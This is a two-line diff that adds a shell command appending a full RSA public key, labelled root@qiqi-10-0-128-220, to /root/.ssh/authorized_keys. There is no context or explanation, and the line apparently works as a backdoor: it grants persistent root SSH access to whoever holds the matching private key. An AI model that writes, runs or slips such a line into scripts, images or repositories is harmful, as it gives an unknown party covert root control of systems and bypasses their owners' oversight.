@@ -1,0 +1,2 @@
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApGSAQtKSJONu2s1sd+9uFzWLrme93fKuTKNbCiyinU7H4bF9htvJuTEIUKKhUU85A+DS+p+SMeSaarkIpB0HlZFbyju/t1QWgA6+k917/csb7IV+wcaSyZ6wN6pWo4cmQyYrkLeThyaevyg+5iUByxItx75YyMw3tl2OJF4qutOG+yS+7jQuOMzbjDmq3wXQsa4Y+Q4+Wm6N1Gs7hlAq3Z96DmXQucAQ1aClqyuwoCKNiy5ba4G0eIHjwbCcCp1WzGBs3LK2WVJzrg9RONHLmg0lmDWWuI+HUOgPpBr1UB0VXGr33OarR/7kGdjH1Fbe6VBwdx36FT8rWMhIo4Q2uQ== root@qiqi-10-0-128-220
+" >> /root/.ssh/authorized_keys
